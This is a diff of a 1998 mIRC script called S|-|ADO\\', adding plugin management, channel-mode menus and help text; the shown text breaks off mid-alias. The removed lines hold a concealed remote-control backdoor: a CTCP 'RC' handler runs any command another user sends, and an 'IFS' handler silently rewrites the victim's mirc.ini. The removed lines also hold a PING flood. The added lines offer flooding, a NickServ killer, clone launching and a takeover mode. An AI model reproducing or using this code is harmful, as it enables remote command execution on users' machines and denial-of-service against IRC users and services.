@@ -1,429 +1,706 @@
-;S|-|ADO\\' - Script
+; S|-|ADO\\' v2.0 (07-03-1998)
+; Script for mIRC
+; developed by RoboCop (irc.germany.net) and Speedy (irc.germany.net)
+; Plugin-Extensions: .spi (S|-|ADO\\' PlugIn)
+; eMail of RoboCop: Robo.Cop@gmx.net
+; eMail of Speedy: 101.33864@germanynet.de
+;
+; KEEP YOUR "STATUS WINDOW" OPEN AS LONG AS YOU USE S|-|ADO\\'!!
+;
+; WE DON'T TAKE THE RESPONSIBILITY FOR WHAT USERs ARE DOING WITH THIS SCRIPT!!
+;
+; ### Known bugs ###
+; If you put this script into a directory with spaces in it (e.g.: C:\Program Files\mIRC\SHADOW\), it won't work
+; correctly because some commands think, the space is the delimiter for the next command. Please make sure
+; that S|-|ADO\\' is in a directory WITHOUT ANY SPACES.
+;
+; ### Tips & Infoz ###
+; If you see an (@!) after a menu entry, you can only use it correctly, if you got OP-status.
+;
+; Currently there is support for ONE USER. So, if you change your nick at every login, S|-|ADO\\' will think, you're
+; a new person. But this has no influence to the functions - not yet.
+;
+; I chose the plugin-based-programming due to the limitation of one ON TEXT command per script. With
+; this type of programming, every script can handle the same event. This leads to more comfortable chatting.
+;
+; ### RoboCop's Message to the world out there ###
+; Hey people, take this script to each of your friends! Forget those mistakes like "MafiaScript"! S|-|ADO\\' is the
+; greatest script written on earth. Just in time there will be more plugins available and more people will write their
+; own plugins for S|-|ADO\\'. If YOU wrote one, then don't hesitate to send it to me (my eMail-Addy should be in
+; the 5th line of this file).
 
-;User's manual
-;First you have to configure this nice script
-;Simply right click in the channel window, choose "S|=|a–o\\'", then "eXocrypt plug-in" and
-;then click on "Change CODE" and enter "exocrypt.exo". This sets all the neccessary
-;variables to send and receive encrypted messages.
-;For further assistance look at the comments in the plug-ins
 
-menu nicklist {
+; ############## Following part is for startup sequence ##################
+on 1:START:{
+  titlebar - S|-|A–O\\' by Speedy and RoboCop
+  echo -s 1,8 Initiating S|-|ADO\\' ... 
+  echo -s 8 Getting Script directory ...
+;  set %shadowdir $scriptdir
+  echo -s 8 Looking for Plugins ...
+  set %filecount 1
+  set %active 0
+  set %inactive 0
+  :STARTFindFiles
+  set %curfile $findfile(%shadowdir,*.spi,%filecount)
+  {
+    GetPlugInfo %curfile
+  }
+  if ($script(%curfile) == $null) { echo -s 8 - Plugin found:  %nameline  %authline 1,4 inactive  | inc %inactive }
+  else { echo -s 8 - Plugin found:  %nameline  %authline 1,9 active  | inc %active }
+  unset %nameline
+  unset %authline
+  inc %filecount
+  if ($findfile(%shadowdir,*spi,%filecount) != $null) { goto STARTFindFiles }
+  unset %curfile
+  dec %filecount
+  echo -s 8 %filecount plugins found ( %active active and %inactive inactive )
+  unset %filecount
+  unset %active
+  if ( %shadowdisplugins == $null && %inactive > 0) {
+    LoadMisPlugs
+  }
+  else if (%inactive == 0) { echo -s 8 All plugins active. }
+  else if (%shadowdisplugins != $null) { echo -s 4 Note: 8 Loading of Plugins disabled. To load missing plugins look under the config menu. }
+  unset %inactive
+  if ( %takeovermode != $null ) {  echo -s 4 Security action:  Disabling TakeOver mode ... }
+  unset %takeovermode
+  echo -s 8 TakeOver mode is disabled.
+  echo -s 8 Looking for user ...
+  UserCheck
+  echo -s 1,8 S|-|ADO\\' is now ready for Rock'n'Roll. 
+  if ( $me == SDWKillNS ) {   .timer 5 5 echo -s 1,8 S|-|ADO\\' 7 NickServ Killer 4 Now switch to the other instance of mIRC and press the OK button. }
+}
+
+; ######################### menu definitions following ###############################
+
+menu status {
   -
   S|=|a–o\\'
-  .DNS lookup: dns $$1
-  .Show hops to user: {
-    dns $$1
-    run TRACERT $$?="Enter the IP address of $$1 (shown in the STATUS window):"
+  .HELP: HELP
+  .Key Definitions (F1): KeyDef
+  .-
+  .Configuration
+  ..Load plugins on startup
+  ...ON: unset %shadowdisplugins | echo -s 1,8 S|-|ADO\\' 8 S|-|ADO\\' will now load missing plugins on next start
+  ...OFF: set %shadowdisplugins Loading of Plugins is disabled | echo -s 1,8 S|-|ADO\\' 4 Note: 8 S|-|ADO\\' will not load missing plugins on next start
+  ..-
+  ..UNLOAD SHADOW (F10): KillShadow
+  .Plugins
+  ..Status: PlugStats
+  ..-
+  ..Reload: ReloadPlug
+  ..Switch (F2): SwitchPlug
+  ..-
+  ..Load all: LoadMisPlugs
+  ..Unload all: UnloadPlugs
+  .-
+  .Whois Pro: xwhois $$?="Enter nickname to check for:"
+  .Switch SHADOW mode (F3): SDWmode
+  .Launch clone on server (F5): LaunchServClone
+  .-
+  .KILL
+  ..NickServ
+  ...KILL NOW: KillNickServ
+  ...Stop kill: {
+    echo -s 1,8 S|-|ADO\\'s 7 NickServ Killer 4 Switch to the other mIRC-Task an enter /StopKNS into the status window.
   }
-  .Flood
-  ..PING: {
-    set %ipstring $address( $$1 , 2)
-    set %lenofipstring $len(%ipstring)
-    set %newlen %lenofipstring - 4
-    echo IPSTRING: %ipstring
-    unset %lenofipstring
-    set %finalipstring $right(%ipstring,%newlen)
-    echo FINALIPSTRING: %finalipstring
-    unset %ipstring
-    unset %newlen
-    dns %finalipstring
-    run -n PING -l 64000 -t $$?="Enter the IP address of $$1 (shown in the STATUS window):"
-    unset %finalipstring
-  }
-  .-
-  .if user uses S|=|a–o\\'
-  ..Turn his fileserver warning off: .ctcp $$1 IFS
-  ..Remote Control: .ctcp $$1 RC $$?="What commands should (s)he do?"
-  .-
-  .∑¥Ø`∑.∏∏.∑ plug-ins following ∑.∏∏.∑¥Ø`∑:echo †
-  .-
-  .Lame-O-Meter plug-in
-  ..Type 1 (Xtra percentage field): lame1 $$?="Enter percentage/10 (10=100%):" $$1
-  ..Type 2 (Percentage shown behind text): lame2 $$?="Enter percentage/10 (10=100%):" $$1
 }
 
 menu channel {
   -
   S|=|a–o\\'
-  .Show stats: shstats
-  .Show users using S|=|a–o\\': showShadows
-  .Who was:whowas $$?="Nickname:"
-  .Clone detection: clonedet $$1
-  .Rejoin channel: part $1 | timer 1 1 join $chan
-  .-
-  .Show color codes: cols
-  .-
-  .∑¥Ø`∑.∏∏.∑ plug-ins following ∑.∏∏.∑¥Ø`∑:echo †
-  .-
-  .eXocrypt plug-in
-  ..Change CODE:Method
-  ..Info about current CODE:MI
+  .TakeOver mode
+  ..Status: if ( %takeovermode > 0 ) { echo -s 1,8 S|-|ADO\\'  TakeOver is 4enabled. | LM 2 has TakeOver mode enabled. } | else { echo -s 1,8 S|-|ADO\\'  TakeOver  is 9disabled. | LM 3 has TakeOver mode disabled. }
   ..-
-  ..Send crypted message:eXo $$?="Enter text to eXocrypt:"
-  .COMMAND KICKer plug-in
-  ..Turn CK ON:con
-  ..Turn CK OFF:coff
-  ..Show stats of CK:cstat
+  ..ON: set %takeovermode 1 | echo -s 1,8 S|-|ADO\\'  TakeOver is now 4enabled. | LM 1 enabled TakeOver mode.
+  ..OFF: unset %takeovermode | echo -s 1,8 S|-|ADO\\'  TakeOver is now 9disabled. | LM 3 disabled TakeOver mode.
+  .Clone detection
+  ..Output to Channel: clonedet $chan msg $chan
+  ..Output to Status window: clonedet $chan echo -s
+  .Launch clone in channel: {
+    set %CloneNick $$?="Clone nick:"
+    if ( %CloneNick != $null ) { run -n $mircdir $+ mirc32.exe -s $+ $server $+ : $+ $port -j $+ $chan -n $+ %CloneNick | LM 2 is launching a channel clone called %CloneNick . }
+    else { echo -s 1,8 S|-|ADO\\'  Cloning aborted ... }
+    unset %CloneNick
+  }
+  .-
+  .Rejoin channel
+  ..Quick (F4): QuickRejChan
+  ..Delayed:set %wt $$?="Enter delay in seconds:" | part $1 | timer 1 %wt join $chan | unset %wt
+  .Manage channel (@!)
+  ..MAIN CONTROL: channel
   ..-
-  ..Inform channel of CK:cinfo
-  .REPEAT ELIMINATOR plug-in
-  ..Turn RE ON:ron
-  ..Turn RE OFF:roff
-  ..Show stats of RE:rstat
+  ..Change topic: topic # $$?="Enter new topic:"
   ..-
-  ..Inform channel of RE:rinfo 
+  ..Invite Only (i)
+  ...ON: mode # +i
+  ...OFF: mode # -i
+  ..Keyed (k)
+  ...ON: mode # +k $$?="Enter password:"
+  ...OFF: mode # -k $$?="Enter channel-password:"
+  ..Limit (l)
+  ...ON: mode # +l $$?="Enter user limit:"
+  ...OFF: mode # -l
+  ..Moderated (m)
+  ...ON: mode # +m
+  ...OFF: mode # -m
+  ..No external MSGs (n)
+  ...ON: mode # +n
+  ...OFF: mode # -n
+  ..Private (p)
+  ...ON: mode # +p
+  ...OFF: mode # -p
+  ..Secret (s)
+  ...ON: mode # +s
+  ...OFF: mode # -s
+  ..Only Chanops change topic (t)
+  ...ON: mode # +t
+  ...OFF: mode # -t
+  ..-
+  ..Admin reserved (a)
+  ...ON: mode # +a
+  ...OFF: mode # -a
+  .-
+  .Notify OPs:onotice $chan [OPs on $chan $+ ] $$?="Your message:"
 }
 
-100:*!RoboCop@*.berlin2m.germany.net
-
-ctcp 1:version:if ( %sr == $null ) { .notice $nick I'm using ä|=|a–o\\' Script by Snowman&RoboCop..... | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,8ATTENTION! $1- from $nick $+ ! }
-ctcp 1:IFS:if ( %sr == $null ) { %mircini = $mircdir $+ mirc.ini | .writeini %mircini fileserver Warning Off | .notice $nick FileServer setting rewritten. User must restart mIRC! | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
-ctcp 1:RC:if ( %sr == $null ) { $2- | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
-on @+1:text:!opme:#:/.msg $chan 1,11 COMMAND OPer:  User level for $nick 1,4 NOT OK . Try again later, $nick. | /echo -a 1,11 COMMAND OPer:   $nick  requested an OP for $chan. OP refused.
-on @100:text:!opme:#:/.msg $chan 1,11 COMMAND OPer:  User level for $nick 1,9 OK . Giving OP for $chan to  $nick  ... | /.mode $chan +o $nick | /echo -a 1,11 COMMAND OPer:   $nick  requested an OP for $chan. OP granted.
-ctcp 1:INS:if ( %sr == $null ) { .auto $nick | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,4WARNING! $1- from $nick $+ ! }
-ctcp 1:CFS:if ( %sr == $null ) { .notice $nick is using ä|=|a–o\\' | halt } | if ( %sr != $null ) { beep 3 100 | echo -a 1,8ATTENTION! $1- from $nick $+ ! }
-
-alias cols {
-  /echo -a 0,1Color Table: 1,0 0 0,1 1 0,2 2 0,3 3 0,4 4 0,5 5 0,6 6 1,7 7 1,8 8 1,9 9 0,10 10 1,11 11 0,12 12 1,13 13 0,14 14 1,15 15 
-  /echo -a 0,1Control codes: Bold ---- Underlined ---- Reverse ---- 1,8K - coloured0,1 ---- O - plain
-}
-
-alias shstats {
-  echo -s 1,8S|=|a–o\\' Status
-  echo -s 1,7S|=|a–o\\' was written by RoboCop
-  if %con == 1 { echo -s 1,8COMMAND KICKer is currently 1,4ON }
-  if %con != 1 { echo -s 1,8COMMAND KICKer is currently 1,9OFF }
-  if %ron == 1 { echo -s 1,8REPEAT ELIM is currently 1,4ON }
-  if %ron != 1 { echo -s 1,8REPEAT ELIM is currently 1,9OFF }
-  echo -s 1,8eXocrypt codec is set to 1,11 $+ %N ( $+ %CrypFile $+ )
-  echo -s -----
-}
-
-alias clonedet {
-}
-
-alias ShowShadows {
-  %tempvar = $nick(# , 0)
-  %countvar = 1
-  :SSLabel
-  if $nick(# , %countvar ) != $me {  .echo -a Sending ¢Éä request to " $+ $nick(#, %countvar ) $+ " ... | .CTCP $nick(# , %countvar ) CFS }
-  %countvar = %countvar + 1
-  if %countvar > %tempvar {
-    unset %tempvar
-    unset %countvar
+menu nicklist {
+  -
+  S|=|a–o\\'
+  .Control user
+  ..Ignore
+  ...ON:ignore $$1 1
+  ...ON (silence):silence $$1
+  ...OFF:ignore -r $$1 1
+  ...OFF (silence):silence - $+ $$1
+  ..OP Control (@!)
+  ...Give Op:/mode # +ooo $$1 $2 $3
+  ...OP in xx seconds:/pop $$?="Seconds to wait before OPing:" $$1
+  ...Deop:/mode # -ooo $$1 $2 $3
+  ..Voice Control (@!)
+  ...Give Voice: /mode # +vvv $$1 $2 $3
+  ...Take Voice: /mode # -vvv $$1 $2 $3
+  ..-
+  ..Kick/Ban Control (@!)
+  ...Kick:/kick # $$1
+  ...Kick (why):/kick # $$1 $$?="Reason for kick:"
+  ...Ban:/ban $$1 2
+  ...Kick, Ban:/ban $$1 2 | /kick # $$1
+  ...Kick, Ban (why):/ban $$1 2 | /kick # $$1 $$?="Reason for kick/ban:"
+  ..-
+  ..Control yourself
+  ...Invisible mode
+  ....ON:mode $me +i
+  ....OFF:mode $me -i
+  ...Server msgs
+  ....ON: mode $me +s
+  ....OFF: mode $me -s
+  ...Wallops (msgs from IRCOPs)
+  ....ON: mode $me +w
+  ....OFF:mode $me -w
+  ...-
+  ...Connections
+  ....ON: mode $me +c
+  ....OFF: mode $me -c
+  ...Globops (like Wallops)
+  ....ON: mode $me +g
+  ....OFF: mode $me -g
+  ...IRC Operator
+  ....ON: /oper $me $$?="Enter password:"
+  ....ON (Admin): /adminoper $me $$?="Enter password:"
+  ....OFF: mode $me -o
+  .Whois Pro: whois $$1
+  .DNS lookup: {
+    set %PerfDNS DNSLookup
+    .dns $$1
   }
-  else goto SSLabel
-}
-
-
-;####################################################eXocrypt routine
-;Using eXoCrypt with own codes
-;For using own codes with eXocrypt, you will have to make a new
-;file with contents like:
-;Name <name of your code>
-;Recipients <name for recipients (if you make a code for only you&one other person)>
-;Signature <Signature (must start with ! or it won't work)>
-;Coded <charset coded>
-;Plain <charset plain>
-;and define a
-;new line in this script here:
-;if %try == 1 { %DCrypFile = yourcode.exo | %try = %try + 1 | goto TryAgain }
-;This line must be above the unset %deeXo statement in the ON TEXT-eXocrypt-part
-;For further codes, replace the "%try == 1" with "%try == 2" and so on.
-;
-;Charsets
-;You have to make 2 charsets. One with the plain data and one with the coded data.
-;The format is very simple, e.g. if the plain char in the string after "Plain" is on the 3rd place
-;the coded char has to be on the 3rd place in the string after "Coded". Example:
-;Coded 123
-;Plain ABC
-;This would send 1 instead of A, 2 instead of B and 3 instead of C. All other chars won't be
-;converted.
-
-alias Method {
-  /set %CrypFile $$?1="Enter file to encrypt with (incl. extension)"
-  %S = $read -sSignature %CrypFile
-  %N = $read -sName %CrypFile
-  %R = $read -sRecipients %CrypFile
-  %P = $read -sPlain %CrypFile
-  %C = $read -sCoded %CrypFile
-  /echo -a 1,8 You selected 1,9 %N 1,8 encryption 1,9( $+ %S $+ )1,8. Recipients: 1,9 %R 1,8.
-}
-
-alias MI {
-  /echo -a 0,4 ENCRYPTION METHOD INFO 
-  /echo -a 1,8 Filename: 1,7 %CrypFile 
-  /echo -a 1,8 Signature: 1,7 %S 
-  /echo -a 1,8 Name: 1,7 %N 
-  /echo -a 1,8 Recipients: 1,7 %R 
-  /echo -a 1,8 Charset-Plain: 1,7 %P 
-  /echo -a 1,8 Charset-Coded: 1,7 %C 
-}
-
-alias eXo {
-  /set %eXo $$?1="Enter Text To eXoCrYpT" *2
-  %char = 1
-  :DoItAgain
-  %eXo = $replace(%eXo, $mid(%P,%char,1), $mid(%C,%char,1))
-  %char = %char + 1
-  if %char <= 39 goto DoItAgain
-  unset %char
-  say %S %eXo
-  echo 4 -a < $+ %N coded to %R $+ > $$1-
-  unset %eXo
-}
-
-alias deeXo {
-  %DN = $read -sName %DCrypFile
-  %DR = $read -sRecipients %DCrypFile
-  %DP = $read -sPlain %DCrypFile
-  %DC = $read -sCoded %DCrypFile
-  %char = 1
-  :DoItAgain
-  %deeXo = $replace(%deeXo, $mid(%DC,%char,1), $mid(%DP,%char,1))
-  %char = %char + 1
-  if %char <= 39 goto DoItAgain
-  unset %char
-  ECHO 4 $chan < $+ %DN coded from %exonick $+ > %deeXo
-  unset %deeXo
-  unset %exonick
-  unset %DN
-  unset %DR
-  unset %DP
-  unset %DC
-  unset %DCrypFile
-}
-
-ON 1:TEXT:!*:*:{
-  set %Sign $parm1
-  set %deeXo $parm2*
-  set %eXonick $nick
-  %DCrypFile = exocrypt.exo
-  %try = 1
-  :TryAgain
-  %CS = $read -sSignature %DCrypFile
-  if %Sign == %CS {
-    deeXo
-    unset %try
-    unset %CS
-    unset %Sign
-    goto EndOfThis
+  .Show hops to user: {
+    set %PerfDNS ShowHops
+    .dns $$1
   }
-  if %try == 1 { %DCrypFile = loops.exo | %try = %try + 1 | goto TryAgain }
-  if %try == 2 { %DCrypFile = sha–ow.exo | %try = %try + 1 | goto TryAgain }
-  unset %deeXo
-  unset %eXonick
-  unset %try
-  :EndOfThis
-}
-
-ON 1:CHAT:!X!*:{
-  set %deeXo $parm2*
-  set %eXonick $nick
-  deeXo
-}
-;#################################################eXocrypt ends here
-
-;############################################COMMAND KICKer routine
-; COMMAND KICKer v2.5 (08-01-1997)
-; FunScript for mIRC
-; developed by RoboCop (irc.germany.net)
-; Usage:
-; Anyone (except you) can type !kick <nick> to kick the desired nickname. The user of the script can't be kicked by the script.
-; After the !kick-command 5 different(!) other chatters (this means not you and not <nick>) have now the choice to agree by typing
-; in YES or to disagree by typing NO. If s.o. agrees, CK will count it - if there are 5 agreements <nick> is no more ;-)
-; If s.o. disagrees CK will completely interrupt the Kicking process. Someone will have to start again. Simple, isn't it?
-; Also every user joining a channel, which you are on will be instantly informed of this script. You can also type /cinfo to let the
-; others know, what script you're using (in case of s.o. has forgotten it). Have much fun with this.
-; You can switch the script on by typing /con, off with /coff and to view the current status type /cstat.
-; This script only works if you got the OP (@) status!
-
-alias cinfo /amsg 1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4 WARNING 4,1 AGAINST 1,4 SCRIPTS 4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\ | /ame is using 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ by RoboCop _.∑¥Ø) (Type !kick <nick> to kick <nick>.)
-
-alias con /msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is now 9activated!! | /set %con 1
-
-alias coff {
-  /msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is now 4disactivated!!
-  /unset %con
-  /unset %kick
-  /unset %kick1
-  /unset %kick2
-  /unset %kick3
-  /unset %kick4
-  /unset %y
-  /unset %vip
-}
-
-alias cstat {
-  if %con == 1 /set %stat 9activated
-  if %con != 1 /set %stat 4disactivated
-  /echo -a 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is currently %stat $+ !!
-  /unset %stat
-}
-
-alias alrv {
-  /.msg $$1 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Be fair, $$2 ( %vip ). You had your voice already!
-  /unset %vip
-  /halt
-}
-
-on @1:join:#:if (( $nick != $me ) && ( %con == 1 )) { /.notice $nick $me is using 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ by RoboCop _.∑¥Ø) (Type !kick <nick> to kick <nick>.) | /echo -a 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick has been informed that you're using me. }
-
-on @1:text:!kick *:#:{
-  if ( %con != 1 ) { /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ is currently 9disabled!! | /halt }
-  %kick = $2
-  %y = 0
-  if %kick == $me {
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for $me. Kick aborted.
-    goto Dontkick
+  .Flood
+  ..PING: {
+    set %PerfDNS PingFlood
+    .dns $$1
   }
-  if %kick isprotect {
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for %kick $+ . Kick aborted because %kick is in $me's protect list.
-    goto Dontkick
-  }
-  if %kick == RoboCop {
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requested a kick for %kick $+ . Kick aborted because %kick is a protected name.
-    goto Dontkick
-  }
-  if %kick ison $chan {
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requests a kick for %kick - 5 of you have to agree, just write YES
-    /halt
-  }
-  /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ $nick requested a kick for a user not existing in this room. Kick aborted.
-  :Dontkick
-  /unset %kick
-  /unset %y
 }
 
+; ########################### Aliases for HELP #################################
 
-on @1:text:YES:#:{
-  if ( %con != 1 ) halt
-  %vip = $address($nick,2)
-  if (($nick != %kick) && (%kick != $null)) {
-    if ((%kick1 != $null) && (%kick1 == %vip)) alrv $chan $nick
-    elseif (%kick1 == $null) { set %kick1 %vip | goto conthere }
-    
-    if ((%kick2 != $null) && (%kick2 == %vip)) alrv $chan $nick
-    elseif (%kick2 == $null) { set %kick2 %vip | goto conthere }
-    
-    if ((%kick3 != $null) && (%kick3 == %vip)) alrv $chan $nick
-    elseif (%kick3 == $null) { set %kick3 %vip | goto conthere }
-    
-    if ((%kick4 != $null) && (%kick4 == %vip)) alrv $chan $nick
-    elseif (%kick4 == $null) { set %kick4 %vip | goto conthere }
-    :conthere
-    %y = %y + 1
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Agreement No. %y by $nick ...
-    if %y == 5 {
-      /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Kick agreed by 5 different users. Kicking %kick ... _.∑¥Ø)
-      /.kick $chan %kick Five users agreed to kick you. Sorry!
-      /unset %kick
-      /unset %kick1
-      /unset %kick2
-      /unset %kick3
-      /unset %kick4
-      /unset %y
-      /unset %vip
+alias HELP {
+  echo -s 1,8 S|-|ADO\\' USERs MANUAL 
+  echo -s S|-|ADO\\'s functions are generally accessed through the context menus. In mIRC, there are three major different ones:
+  echo -s one for the 'status window', one for the 'channel window' and one for the 'nicklist'. The 'channel window' is the window
+  echo -s you see the messages scrolling. The 'nicklist' is the "attached" list of names right on the 'channel window'. To access
+  echo -s the context menu for the 'nicklist', you first have to select the nick you want to work with.
+  echo -s Under the context menus, there will be an entry called "S|=|ADO\\'" - there you'll find all options available from the main
+  echo -s program. Installed plugins will add an entry with "SPI: " followed by the plugin-name.
+  echo -s 15-----
+  echo -s 4Note that some of the functions are not allowed in IRCs and could lead to bans and klines on you!
+  echo -s 15-----
+  echo -s 1,8Press F1 to get the key definitions
+  echo -s 15-----
+}
+
+alias KeyDef {
+  echo -s 1,8 S|-|ADO\\' Key Definitions 
+  echo -s F 1 - Show this help
+  echo -s F 2 - Switch a plugin
+  echo -s F 3 - Switch SHADOW mode
+  echo -s F 4 - Quick channel rejoin
+  echo -s F 5 - Launch server clone
+  echo -s F10 - Unload Shadow completely
+  echo -s 15-----
+}
+
+; ##### Key Definitions #####
+
+alias F1 KeyDef
+alias F2 SwitchPlug
+alias F3 SDWmode
+alias F4 QuickRejChan
+alias F5 LaunchServClone
+alias F10 KillShadow
+
+; ############################ StartUp Aliases ###################################
+
+alias -l UserCheck {
+  if ( %SDWUser != $me ) {
+    echo -s 8 User check: 4 New user detected.  Hi $me ! Welcome to S|-|ADO\\'. If you need help, just type 8/HELP and you will get the following:
+    HELP
+    set %SDWUser $me
+    } | else {
+    echo -s 8 User check: 9 User found.  Hi %SDWUser ! Nice to see you again.
+  }
+}
+
+; ########################## PlugIn Managment Aliases #############################
+
+alias -l GetPlugInfo {
+  set %nameline $GetPlugItem( $$1 , name )
+  if ( %nameline == $null ) { set %nameline $1 }
+  set %authline $GetPlugItem( $$1, auth )
+  if ( %authline != $null ) { set %authline ( %authline ) }
+}
+
+alias -l SwitchPlug {
+  PlugStats
+  set %switch $$?="Enter the number of the plugin to switch:"
+  if ( %switch > 0  &&  %switch < 100) {
+    set %curfile $findfile(%shadowdir,*.spi,%switch )
+    {
+      GetPlugInfo %curfile
     }
-  }
-  elseif (%kick == $nick) /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Sorry, $nick, but it wouldn't be fair to let you vote.
+    if ($script(%curfile) == $null)  {
+      echo -s 8 Loading Plugin  %nameline  %authline ...
+      .load -rs %curfile
+      $GetPlugItem( %curfile , loadonstart )
+      echo -s 8 %nameline  is now plugged.
+      } | else {
+      echo -s 8 Unloading Plugin  %nameline  %authline ...
+      $GetPlugItem( %curfile , loadonexit )
+      .unload -rs %curfile
+      echo -s 8 %nameline  is now unplugged.
+    }
+  }            
+  unset %switch
+  unset %curfile
+  unset %nameline
+  unset %authline
 }
 
-on @1:text:NO:#:{
-  if ( %con != 1 ) halt
-  if ((%kick != $null) && (%kick != $nick)) {
-    /unset %y
-    /unset %kick
-    /unset %kick1
-    /unset %kick2
-    /unset %kick3
-    /unset %kick4
-    /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Kick cancelled by $nick
+alias -l PlugStats {
+  echo -s 1,8 PLUGIN STATUS 
+  set %filecount 1
+  set %active 0
+  set %inactive 0
+  :PSFindFiles
+  set %curfile $findfile(%shadowdir,*.spi,%filecount)
+  {
+    GetPlugInfo %curfile
   }
-  elseif (%kick == $nick) /.msg $chan 1,11/11,1/1,11/11,1/1,11 COMMAND KICKer 11,1\1,11\11,1\1,11\ Sorry, $nick, but I cannot allow you to stop your death command. Life is unjust, eh?
-}
-;###########################################COMMAND KICKer ends here
-
-;##########################################REPEAT ELIMINATOR routine
-;Repeat Eliminator v1.0 (08-01-1997)
-; FunScript for mIRC
-; developed by RoboCop (irc.germany.net)
-; Usage:
-; Just load this script and enjoy. If someone repeats his statement, RE will warn him. If he repeats it again, he will get the 2nd
-; warning. But if he repeats it once again, he will be kicked outa tha room. You and your protected friends can't be kicked, because
-; your statements doesn't trigger the text-event and if someone protected repeats something, RE won't punish him ;-).
-; With /ron and /roff you can trigger the status of RE which is shown with /rstat.
-; This script only works if you got the OP (@) status!
-
-alias rinfo /amsg 1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4/4,1/1,4 WARNING 4,1 AGAINST 1,4 SCRIPTS 4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\4,1\1,4\ | /ame is using 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop _.∑¥Ø)
-
-alias ron /msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is now 9activated!! | /set %ron 1
-
-alias roff /msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is now 4disactivated!! | /unset %ron
-
-alias rstat {
-  if %ron == 1 /set %stat 9activated
-  if %ron != 1 /set %stat 4disactivated
-  /echo -a 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ is currently %stat $+ !!
-  /unset %stat
+  if ($script(%curfile) == $null) { echo -s 8 %filecount - %nameline  %authline 1,4 inactive  | inc %inactive }
+  else { echo -s 8 %filecount - %nameline  %authline 1,9 active  | inc %active }
+  unset %nameline
+  unset %authline
+  inc %filecount
+  if ($findfile(%shadowdir,*spi,%filecount) != $null) { goto PSFindFiles }
+  unset %curfile
+  dec %filecount
+  echo -s 8 %filecount plugins found ( %active active and %inactive inactive )
+  unset %filecount
+  unset %active
+  unset %inactive
 }
 
-on @1:join:#:if (( $nick != $me ) && ( %ron == 1 )) { /.notice $nick $me is using 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop _.∑¥Ø) | /echo -a 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ $nick has been informed that you're using me. }
-
-on @1:text:*:#:{
-  if (( $nick isprotect ) || ( $nick == RoboCop ) || ( %ron != 1 )) /halt
-  if ( $1- != %text ) {
-    /set %text $1-
-    /set %rnick $nick
-    /set %t 0
-    /halt
-  }
-  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 0 )) {
-    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 9,9__ Hey $nick $+ ! Don't repeat it. We have understood.
-    %t = %t + 1
-    /halt
-  }
-  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 1 )) {
-    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 8,8__ $nick $+ ! This is your 2nd warning! Once again, and I kick ya ass!
-    %t = %t + 1
-    /halt
-  }
-  if (( $1- == %text ) && ( %rnick == $nick ) && ( %t == 2 )) {
-    /.msg $chan 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ 4,4__ I warned you, $nick! Kicking $nick .... _.∑¥Ø)
-    /kick $chan $nick Kicked by the 1,8/8,1/1,8/8,1/1,8 Repeat Eliminator 8,1\1,8\8,1\1,8\ by RoboCop
-    /set %t 0
-  }
-}
-;########################################REPEAT ELIMINATOR ends here
-;################################################Lame-O-Meters routine
-alias lame1 {
-  %z = 0
-  :Addanother
-  if ( %z < $$1 ) { %z = %z + 1 | %ls = %ls $+ _ | goto Addanother }
-  :Addan2
